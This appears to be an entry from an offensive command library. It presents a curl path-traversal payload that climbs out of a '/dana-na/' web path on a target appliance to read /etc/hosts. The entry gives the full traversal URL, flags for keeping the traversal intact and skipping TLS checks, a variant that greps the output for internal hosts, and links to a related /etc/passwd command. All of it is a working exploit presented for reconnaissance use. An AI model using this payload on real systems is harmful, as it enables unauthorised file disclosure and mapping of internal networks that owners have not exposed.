---
data: >-
  curl --path-as-is -k -D-
  https://target/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#
tags:
  - path-traversal
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.691Z'
id: afc1b586-2efa-4d3c-8898-4b892d1befdb
verified: false
validated: true
submitted: true
---
# curl-path-traversal-etc-hosts

## Command

```bash
curl --path-as-is -k -D- https://target/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#
```

## Description

Retrieves /etc/hosts via path traversal for network reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--path-as-is` | Keeps traversal intact | Yes |
| `-k` | Bypass SSL checks | Yes |
| `-D-` | Output headers | Yes |
| URL | Path to /etc/hosts | Yes |

## Examples

### Basic Usage

```bash
curl --path-as-is -k -D- https://target/.../etc/hosts?... # Full URL as above
```

### Advanced Usage

```bash
curl --path-as-is -k -D- -s https://target/... | grep internal # Silent, filter internals
```

## Expected Output

/etc/hosts content, e.g., '127.0.0.1 localhost\n 10.0.0.1 internal-db'.

## Related

- [[commands/curl-path-traversal-etc-passwd]]
- [[procedures/Exploit-Path-Traversal-to-Disclose-Etc-Hosts]]
